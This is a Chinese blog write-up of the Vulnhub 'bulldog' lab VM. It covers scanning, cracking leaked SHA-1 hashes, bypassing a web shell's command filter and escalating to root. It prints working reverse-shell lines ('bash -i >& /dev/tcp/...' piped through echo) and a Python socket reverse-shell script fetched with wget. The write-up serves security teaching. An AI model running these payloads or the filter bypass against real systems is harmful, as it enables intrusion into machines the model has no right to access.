> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/phzqs-lnxjDdGs8bb2Wl9g)

**前****文******跟着 **i 春秋 YOU 老师讲解小白渗透之路，并结合作者系列文章总结 Web 渗透技术点**********。**这篇文章将讲解 Vulnhub 靶机渗透题目 bulldog，包括信息收集及目录扫描、源码解读及系统登陆、命令注入和 shell 反弹、权限提升和获取 flag。本文是一篇 Web 渗透的基础性文章，希望对您有所帮助。**

作者作为网络安全的小白，分享一些自学基础教程给大家，希望你们喜欢。同时，更希望你能与我一起操作深入进步，后续也将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不容易，大神请飘过，不喜勿喷，谢谢！

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.html

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好或侵权的地方，可以联系我删除。基础性文章，希望对您有所帮助，作者目的是与安全人共同进步，加油~

文章目录：

*   **一. bulldog 题目描述及环境配置**
    
    **1. 题目描述**
    
    **2. 环境搭建**
    
*   **二. bulldog 靶机渗透详解**
    
    **1. 信息收集及目录扫描**
    
    **2. 源码解读及系统登陆**
    
    **3. 命令注入和 shell 反弹**
    
    **4. 权限提升和获取 flag**
    
*   **三. 总结  
    **
    

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。

一. bulldog 题目描述及环境配置
====================

Vulnhub 是一个特别好的渗透测试实战靶场，提供了许多带有漏洞的渗透测试虚拟机下载。作者会深入分析 20 多个案例来熟悉各种 Web 渗透工具及方法，希望能帮助到您。

1. 题目描述
-------

靶场题目：bulldog

靶场地址：https://www.vulnhub.com/

entry/bulldog-1%2C211/

难度描述：初学者 / 中级，目标是进入根目录并查看祝贺消息，提权到 root 权限查看 flag

靶场作者：Nick Frichette

下载地址：  
https://download.vulnhub.com/bulldog/  
https://download.vulnhub.com/bulldog/bulldog.ova

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9C140USJcApIy7xmzCrpeBfDE3Vclbywpg53NdeYWR3WaWOeYINVSqg/640?wx_fmt=png)

> Description  
> Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don’t you find out? This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!  
> Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That’s my only hint  
> Made by Nick Frichette (frichetten.com) Twitter: @frichette_n  
> I’d highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn’t have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.  

2. 环境搭建
-------

第一步，下载资源

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9IoOnDhINx96dy0Btyb2icDQt4SUbT36RYClkibicNnQWQiclT45BnfYqJg/640?wx_fmt=png)

第二步，打开 VMware 虚拟机安装靶场  
找到我们刚才下载的文件，导入虚拟机。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Rv7OnWYJyWXv4ibCyxEJnOm9P4qv2IBDlBFicOEBesF24aria2MM5T8ug/640?wx_fmt=png)

选择存放的位置，然后点击导入。如果出现未通过 OVF 规范一致性或虚拟硬件合规性检查，请单击 “重试” 导入。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xl9bLHQ7nYVDTuEpib0ibOvhRqw9xsH0Vs2VY59rs651YBSbxnljWcEw/640?wx_fmt=png)

第三步，导入完成之后，设置 NAT 网络模式  
注意，我们需要将靶机和 kali 放在同一个局域网下，保证能通信。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg99QvBXJHCAozOte3RzhgYhcO5ickdShxurBcWDQoTKibibduSfbNEQFicWQ/640?wx_fmt=png)

第四步，点击开启虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9STvpQGwoXWjAyxdCicSavV5KYE7REicVYPbT6kC8N0RlLbia1aYrr7vHw/640?wx_fmt=png)

此时服务器处于开启状态，开始 Kali 操作吧！最早我一直去找用户名和密码尝试登录，后来想这个靶场应该是让你通过其他系统来渗透的。哈哈，毕竟我也是初学者，遇到任何简单问题都理解。

第五步，设置虚拟机网络  
到开机页面选择第二个 Ubuntu 的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。进入高级选项，再次选择第二个 Linux 内核版本的恢复模式回车。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9fBpiazuF55bia19HmtZYvpowlkvEY02THMgsu3xe6HKbxW3vVcIjB9LA/640?wx_fmt=png)

回车后会弹出选择界面，我们选择 root 一行回车，接着再次回车进入命令行模式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9uw42n5Hh4op5Dd5EErDYHDteN6U476PQ8E2Z07akI9tHpXMBnISibAQ/640?wx_fmt=png)

输入 “mount -o rw,remount /” 命令，再配置网络问卷，否则后面可能无法保存网络配置文件，这个命令让我们的 / 路径文件系统的可读模式能自由修改。接着输入命令查看网卡。

*   mount -o rw,remount /
    
*   ifconfig -a
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9217zTOVpiaTbRWGYSMM2IOLHKmW4uT3tzV11ib737axsEqYz6ibytt21Q/640?wx_fmt=png)

作者的是 ens33，然后继续输入命令修改网络配置文件。输入 I 修改模式，如下图所示。

*   vi /etc/network/interfaces
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9jWibgTicyvPCUMn3Qf1uicuBDO4tCtlYwjoIBnGfXHA2JA906KahOlOKQ/640?wx_fmt=png)

修改这两个地方，改成你的网卡名称，然后输入 “:wq” 保存。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9pFWaEMpFXUiaKFv5ETCO8ExfOjSVjSKoxz4pesAOiamEWKI0Q4MJia12g/640?wx_fmt=png)

最后输入 reboot 重启即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9c7IeNuEGxnwYw1Sia5Z51r5gU4HUVicd7oAB0XBK9T2b7fw2Un4EUbKQ/640?wx_fmt=png)

二. bulldog 靶机渗透详解
=================

1. 信息收集及目录扫描
------------

首先是信息收集一波，任何网站或 Web 都需要进行一波扫描和分析。

第一步，目标主机 IP 探测  
首先需要探测目标靶场的 IP，推荐三种方法。

方法 1：使用 arp-scan 命令探测目标的 IP 地址

*   arp-scan -l
    
*   目标 IP 为 192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9nJZ1EO0iaic4Elbd7VOaibSGlnP40iaYMibXkBaBObuT5ocD5yGNNz6Tbng/640?wx_fmt=png)

方法 2：使用 nmap 识别目标主机

*   nmap -sP 192.168.44.0/24
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg959bRs1crNNysWkN3RvqamaxZqUv79bHwC2JdeqIHjTHABjSnibwtgBg/640?wx_fmt=png)

方法 3：使用 netdiscover 识别目标主机

*   netdiscover -r 192.168.44.0/24 -i eth0  
    作者结合自己的虚拟机识别出来 IP 地址为：192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9UNNo3Cnq6ST9vOW0ib9T4IqH0qA1OfgrJxmhxz5hW8Q6w6udMFo0Mpg/640?wx_fmt=png)

第二步，端口扫描  
nmap 命令的基本用法如下：

*   -sS：半开扫描，记入系统日志风险小
    
*   -sP：扫描端口前，先使用 ping 扫描，保证主机存活
    
*   -A：全面系统检测，启用脚本检测和扫描
    

输入命令如下：

*   nmap -sS -T4 -A -p- 192.168.44.153
    

扫描结果（主机开放端口）如下，常用的端口 23、88 和 8080，发现 SSH 服务和 Web 服务，并且 Web 服务为 python。23 端口是 telnet 的默认端口，80 端口和 8080 端口经常被用作提供 web 服务。

*   23：SSH 远程连接
    
*   80：HTTP 网站协议
    
*   8080：HTTP 网站协议
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9aQfP9fXryuCE206SRO6Qr6ujMRFHbwFWchLANUR9ibScJnhRk9HV8aw/640?wx_fmt=png)

接着我们可以借助 nc 及其他工具对每个端口进行分析。

*   nc -nv 192.168.44.153 23
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9OlqHibpSz7tDnLvUXaFaTUyYuPk2MaOz2ozmJ6daZfnRMmbKicr3rNTw/640?wx_fmt=png)

这里显示 23 是一个远程端口，运行着 openssh 服务。接着尝试在终端中输入 “ssh -v test@192.168.44.153 -p 23” 测试。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9oxkwBjta3UCA0XQ83DTLmZVibriaYX2h6jGiaWVWiaCNH8vdxG1iciaGTnPA/640?wx_fmt=png)

接着测试 80 端口和 8080 端口，运行结果如下：

*   nc -nv 192.168.44.153 80
    
*   nc -nv 192.168.44.153 8080
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9zX2TqfVYgh56rh3xLATMbJ7eHLWDg72Hp46wAPc1h0d4K23AIA3EQA/640?wx_fmt=png)

接下来使用搜索引擎搜索 “WSGIServer/0.1 Python /2.7.12“，结果显示这是一个 Django Web 服务器。

第三步，目录扫描  
在信息扫描中，目录扫描是接下来的操作，利用 dirb 扫描 80 端口的目录文件，敏感文件分析非常重要。

*   dirb http://192.168.44.153
    

使用 dirb 扫描到两个目录，但是没有任何有用信息。

*   DIRECTORY: http://192.168.44.153/admin/
    
*   DIRECTORY: http://192.168.44.153/dev/
    
*   DIRECTORY: http://192.168.44.153/admin/auth/
    
*   DIRECTORY: http://192.168.44.153/admin/login/
    
*   DIRECTORY: http://192.168.44.153/admin/logout/
    
*   DIRECTORY: http://192.168.44.153/dev/shell/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9z2LwFTmysR1VT4mMRUddeUp5V50nOwovBhbck49icwTQFEaGoibR54icA/640?wx_fmt=png)

2. 源码解读及系统登陆
------------

第一步，敏感文件分析  
尝试用浏览器访问网址，网页中包含了一张 bulldog 图片和文字。

*   http://192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9eMIuyP0BKTj98iau05oGX8PFGkuXjj6Kiaendw6VWHxIZQA3qpicrDBXg/640?wx_fmt=png)

查看源代码发现是 POST 提交请求，没有价值信息。

*   http://192.168.44.153/admin
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9K3UtHFIh5mkDicaDfoDWpWsQib49g2KCndbjWAD2ibIIPpCmsE8Z6B1vg/640?wx_fmt=png)

打开 admin 尝试人工注入失败，也可以用 Burp 注入测试下。

*   http://192.168.44.153/admin/login/?next=/admin/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9WyNknpHUXuYCVpkuToID2s0wvtb4aiaad9khnGQedvz22wShWS2cFibw/640?wx_fmt=png)

从扫描结果中，我们得到一个很有意思的 web 目录 /dev/ ，浏览器中访问。

*   http://192.168.44.153/dev/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9wOhTfuWVj52r2e4cxwBWibZw1u5eTk9WQkAOiacpicAQUEb8nddlT4sVA/640?wx_fmt=png)

浏览一下，发现 / dev / 页面的信息比较多，简单翻译如下。大概意思移除了 PHP、phpmyadmin 和 CMS 系统，新的系统是用 Django 编写并且启用了 SSH。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9OZx0gD7QUkNia0ffVVxY2PdqqU10TqbmOM89gNXhbMpkc2ZDCemfkvg/640?wx_fmt=png)

查看 / dev/shell 发现 Webshell 不能使用，需要通过服务器进行身份验证才能使用 Webshell。通常 Webshell 是能为我们所用的，但现在提示与服务器进行身份验证才能使用 Webshell，那接着看看源代码（之前 dirb 扫描出该目录）。

*   http://192.168.44.153/dev/shell/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9fsbAjNDibkwibXbs4ox8OrOoTHDRhaS2mibSWibWQz4B66KIJacyEbhWAA/640?wx_fmt=png)

第二步，查看网页源代码并分析

查看 /dev/ 源代码，可以看到邮箱和一些 hash 值。

*   Team Lead: alan@bulldogindustries.com
    
    – 6515229daf8dbdc8b89fed2e60f107433da5f2cb –
    
*   Back-up Team Lead: william@bulldogindustries.com
    
    – 38882f3b81f8f2bc47d9f3119155b05f954892fb –
    
*   Front End: malik@bulldogindustries.com
    
    – c6f7e34d5d08ba4a40dd5627508ccb55b425e279 –
    
*   Front End: kevin@bulldogindustries.com
    
    – 0e6ae9fe8af1cd4192865ac97ebf6bda414218a9 –
    
*   Back End: ashley@bulldogindustries.com
    
    – 553d917a396414ab99785694afd51df3a8a8a3e0 –
    
*   Back End: nick@bulldogindustries.com
    
    – ddf45997a7e18a25ad5f5cf222da64814dd060d5 –
    
*   Database: sarah@bulldogindustries.com
    
    – d8b8dd5e7f000b8dea26ef8428caf38c04466b3e –
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9jQohhclpV9gQ7iaicUVAYasd5Cg9MVCTkgfhCVNXrqMq8DYMR0bdoLGg/640?wx_fmt=png)

方法一：在线网站爆破  
每个邮箱后都有一个哈希值，这很可能是 password，接着对每个 md5 进行在线解密。

*   https://cmd5.com/
    
*   https://www.somd5.com/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Cl3NSyNKjyOtdoaTLUoiaFGrrlvaTXtAjA0Cqibibql34jh7d0yeyib3tg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9YNYENHQYaU3FPPCP1ibDXG0XnP53PciaQ7BrmbPczSZJFbWgA5JYTQqg/640?wx_fmt=png)

解密出最后两条信息：

*   bulldog (Back End nick@bulldogindustries.com)
    
*   bulldoglover (Database sarah@bulldogindustries.com)
    

方法二：通过 hash-identifier 工具和 John  
爆破它们，就需要知道是哪种算法生成的这些值，我们借助一个开源的工具 “hash-identifier” 来识别哪种 hash。

*   hash-identifier
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9c60wCYuML9G8KGActk2DFn4Bpg0QlYoGAo6Mp7TVf5A121A9ibG2Q9Q/640?wx_fmt=png)

其结果是 SHA-1 哈希，接下来使用 John-The-Ripper 进行解密即可。  

接下来，我们使用用户名 nick@bulldogindustries.com 和 sarah@bulldogindustries.com 以及对应的密码 bulldog 和 bulldoglover 登陆，却失败告终。接着大胆猜测，用户名为 nick 和 sarah ，密码分别对应 bulldog 和 bulldoglover。

*   用户名：nick，密码：bulldog
    
*   用户名：sarah，密码：bulldoglover
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg98phAibA8XIicgPPfUcPupIIYRMnfuWVqQ1nJrowwXrgoSg25SY6hUSlg/640?wx_fmt=png)

成功登录系统，但提示没有对应的权限。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Fzxxcel65fyjKBoObbthibIwzFpHc1VX2jb6bjCsJuIP2at3IdJxZFg/640?wx_fmt=png)

3. 命令注入和 shell 反弹
-----------------

第一步，访问 Webshell 的基本命令  
尝试访问 http://192.168.44.153/dev/shell，成功得到 Webshell，此时能够提交 6 个命令。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9qwU68ObOv970vNwOEv1WZcPWHx0iaWEpJcoYS9vlKzOBF2JvEAyx5AQ/640?wx_fmt=png)

这里给我们 6 个可用的命令，如下图所示，比如输入 “ifconfig” 查看网络。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9hGyP9WM9j7OlAQ0z0MXoJt0unRBIUXibZ5N7qVtxDml2OTn7GCFTpFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9JsbSsSO2Zce07hs4pibO2Aogpkeg9ibdahS1tNg3pcCnwH6s7YDJekPw/640?wx_fmt=png)

但执行其他的命令会被拦截，因为该网站加了过滤，一些敏感命令没办法使用。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9HhKg5dN9xSGL8Vz5nJOv6sicJZJh3JfEXGef2sUwvhSVMpxkRNibnibnA/640?wx_fmt=png)

第二步，使用 Linux 的 & 和 | 进行命令组合绕过

*   ifconfig&&ls
    
*   ifconfig & whoami
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg98wrP5j3IcrZDiatwvIGcjUrxyEjicwUkVkJsTFbeK53kMJW9Oqopwm7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9H5ibmW5iaiajvSlyrBh2Q81tLCP1mkxzD8gUbSQCwS96vIrib89tjsj6Gg/640?wx_fmt=png)

我们需要想办法绕过防火墙取得最终权限，经过一番琢磨，用 echo 命令打包可以实现绕过，例如：echo whoami|sh。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9CIjhoEgibphFOtss0oh5Ul8H4TFbz9khmPYF5t0hBR4IRXdLBUhgsUw/640?wx_fmt=png)

第三步，nc 监听端口并反弹 shell  
本地执行 nc -lvp 4444 监听本地端口 4444，然后在 Web-shell 上执行反弹脚本。

*   nc -lvp 4444
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Rj4ojQ75F23uicPJcLybASBvGOHp0zDj3ibsjz4jLO5vicgdPibBCrOaQw/640?wx_fmt=png)

接着尝试 bash 反弹，在靶机打开的网页命令框中输入命令，但结果提示错误。

*   bash -i >& /dev/tcp/192.168.44.138/4444 0>&1
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9FSpZohzCOYiaAT690b5zEMDKSOicibGYbgheZp1CJRlSV8VhEbtjsXRQA/640?wx_fmt=png)

由于 echo 命令是允许执行的，所以利用 echo 构建一个反弹 shell 的命令，然后用管道符给 bash 执行。

*   ls &&echo “bash -i>& /dev/tcp/192.168.44.138/4444 0>&1” | bash
    
*   echo “bash -i>& /dev/tcp/192.168.44.138/4444 0>&1” | bash
    
*   IP 地址为 Kali 攻击机地址
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9BPp9e3m8M3bhAgK6gYr9lOqXPO4I1UQn8magfIYciaTsf4yJsiaR9UIQ/640?wx_fmt=png)

在 web 页面执行 echo ‘bash -i >& /dev/tcp/192.168.44.138/4444 0>&1’|bash，就可以弹回一个 shell。注意，这里的 IP 地址是 Kali 系统的，否则会提示 “500 错误”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9H5lRJU9ibtNsEvU82eibVkia2l24DfOV3a2LoPo05dNfWNkoOXs4CfTUw/640?wx_fmt=png)

此时的 nc 处于正常监听状态，并且成功反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9opYOc4Q3yQDjesHBq2rIqo9icwpI4icKib2diaA4HlB60cAqwTvcaB62hQ/640?wx_fmt=png)

同时，补充另一种方法。通过 Kali 搭建一个简易 Web 服务，反弹 shell 的脚本要写到相应的目录，否则靶机用 wget 下载的时候就会访问失败。

```
import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("192.168.44.138", 4444))  #Kali系统IP地址 4444是nc的监听端口os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/bash","-i"])
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Cv67HpaKWEibjrJK114ZKvbhJjbyTa4V0WKtfxOibGfLFmLgib7orxU2g/640?wx_fmt=png)

如果服务器搭建在 / var/www/html 文件时，需要把脚本写到 / var/www/html。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9EObNYPDm64VNv7yTFP5a3jnNRs0hugTeyjn2NknIBKnfSZGkXicbuyw/640?wx_fmt=png)

输入下面监听 Python 网站。

*   python -m SimpleHTTPServer 80
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9dcEKLcj2Nq6TdL6PvOD8sRIHicicjSUesZpXBNVumgJnV9bJ1pn6SYgQ/640?wx_fmt=png)

靶机用 weget 命令上传 Python 文件，并反弹 shell。

*   pwd&wget http://192.168.44.153/bulldog-webshell.py
    
*   反弹成功 输入 python -c ‘import pty;pty.spawn("/bin/bash")’
    

至此，我们得到了 django 的普通权限，下一步就是想办法提权，这就需要不断地去探索发现整个系统的漏洞。

4. 权限提升和获取 flag
---------------

nc 反弹 shell 之后，我们可以使用命令进行一系列的查看。

*   ls
    
*   cd
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9mdpVpibuFPD9EQcZWEscdPib5r0jPkDpxj8LyhF28AKQ2ibeWP2h8JTKQ/640?wx_fmt=png)

切换目录到 bulldogadmin，并查看全部文件，包括隐藏文件。

*   cd bulldogadmin
    
*   ls -al
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9tLMTVoXcSJq736DvyfkcnXEAtqmcKndeEHicSezoPXxkROXOvibObhbg/640?wx_fmt=png)

这里发现一个. hiddenadmindirectory 文件，进入隐藏管理员目录查看。看到 customPermissionApp，它应该是分配权限的一个程序，但我们没有权限打开。接着怎么办呢？虽然不能执行，但是尝试查看文件的内容和字符串。

*   cd .hiddenadmindirectory
    
*   ls -al
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xOemUN6Sp4dPLmtOEia6N5Ctw2ryicLeI4SQ7UTwnFttbMQQhskayCMw/640?wx_fmt=png)

利用 string 查看可执行文件中的字符。

*   strings customPerssionApp
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9ibibfb5737ia6rzaFUyuYnDB4crDUUpXWTgAEOCBSwAk3sQCYW9jmRkGA/640?wx_fmt=png)

从以上字符猜测该程序的用途，推测其是密码。通过下列四个字符拼接，注意每一段后面的 H 不是密码需要去除。

```
SUPERultH
imatePASH
SWORDyouH
CANTget
```

*   密码：SUPERultimatePASSWORDyouCANTget
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg95nsv7ZIdJC3Rm4kKf7Qff7rkgVmW7oAlF6lIRLAmJLTAyFWxtuorpg/640?wx_fmt=png)

接着想办法用上面的密码提升 django 或者 bulldogadmin 权限，我们想通过 sudo su - root 拿到 root，但提示 “su must be run from a terminal”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9zF2A3WEalLwMCS3L9SHricAd4TEQgN64nZFsF4o8y8Jbibb7NrXUP0MQ/640?wx_fmt=png)

这里补充一个技巧，可以用 Python 调用本地的 shell 实现，命令如下：

*   python -c 'import pty; pty.spawn("/bin/bash")'
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Xg49oeSRU87uDCGYVRkQWzP0GuPPmTIgGWzsfpbmegjNA3X9g8SVLg/640?wx_fmt=png)

然后执行命令 sudo su -，输入刚才记下来的密码，成功从 django 权限提升到 root 权限，最终成功获得 root 权限并拿到 flag。

*   sudo su -
    
*   密码：SUPERultimatePASSWORDyouCANTget
    

输入 ls 命令，发现里面只有一个文本文档，再输入 cat congrats.txt 查看文件，最后读取 flag 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xQ43BzMH9hr9vibn6ZuQwEyCy5HDEA0SiaCBUcuMuONmno3XyomfmGZg/640?wx_fmt=png)

三. 总结
=====

写道这里，这篇文章讲解完毕，后续会更深入的分享。bulldog 的渗透流程如下：

*   信息收集  
    目标 IP 探测 (arp-scan、netdiscover、nmap)  
    Nmap 端口扫描
    
*   目录扫描  
    用 dirb 扫出了许多关键目录（admin 和 dev 页面）
    
*   敏感文件查找及网页访问
    
*   MD5 破解（在线破解、hash-identifier）  
    仔细观察网页信息，该靶机主要在 / dev 目录处前端源码泄露了 MD5 密码信息
    
*   登录管理员账号，并在 / dev/shell 页面利用命令注入漏洞
    
*   命令注入和 shell 反弹  
    命令拼接（ls &&echo “bash -i>&
    
    /dev/tcp/192.168.44.138/4444 0>&1” | bash）  
    nc 反弹 shell（nc -lvp 4444）  
    Python 搭建临时 Web 服务（python -m SimpleHTTPServer 80）
    
*   权限提升和获取 flag  
    sudo python -c ‘import pty; pty.spawn("/bin/bash")’  
    sudo su - root
    

学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全和系统安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，深知自己很菜，得努力前行。编程没有捷径，逆向也没有捷径，它们都是搬砖活，少琢磨技巧，干就对了。什么时候你把攻击对手按在地上摩擦，你就赢了，也会慢慢形成了自己的安全经验和技巧。加油吧，少年希望这个路线对你有所帮助，共勉。

前文分享（下面的超链接可以点击喔）：

*   [[网络安全] 一. Web 渗透入门基础与安全术语普及](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483786&idx=1&sn=d9096e1e770c660c6a5f4943568ea289&chksm=cfccb147f8bb38512c6808e544e1ec903cdba5947a29cc8a2bede16b8d73d99919d60ae1a8e6&scene=21#wechat_redirect)
    
*   [[网络安全] 二. Web 渗透信息收集之域名、端口、服务、指纹、旁站、CDN 和敏感信息](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483849&idx=1&sn=dce7b63429b5e93d788b8790df277ff3&chksm=cfccb104f8bb38121c341a5dbc2eb8fa1723a7e845ddcbefe1f6c728568c8451b70934fc3bb2&scene=21#wechat_redirect)
    
*   [[网络安全] 三. 社会工程学那些事及 IP 物理定位](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483994&idx=1&sn=1f2fd6bea13365c54fec8e142bb48e1d&chksm=cfccb297f8bb3b8156a18ae7edaba9f0a4bd5e38966bdaceeff03a5759ebd216a349f430f409&scene=21#wechat_redirect)
    
*   [[网络安全] 四. 手工 SQL 注入和 SQLMAP 入门基础及案例分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484068&idx=1&sn=a82f3d4d121773fdaebf1a11cf8c5586&chksm=cfccb269f8bb3b7f21ecfb0869ce46933e236aa3c5e900659a98643f5186546a172a8f745d78&scene=21#wechat_redirect)
    
*   [[网络安全] 五. XSS 跨站脚本攻击详解及分类 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484381&idx=1&sn=a1d459a7457b56b02e217f39e5161338&chksm=cfccb310f8bb3a06442b001fc7b38a0363b9fbd4436f450b0ce6fa2eeb5c796fc936ceb5d6fa&scene=21#wechat_redirect)
    
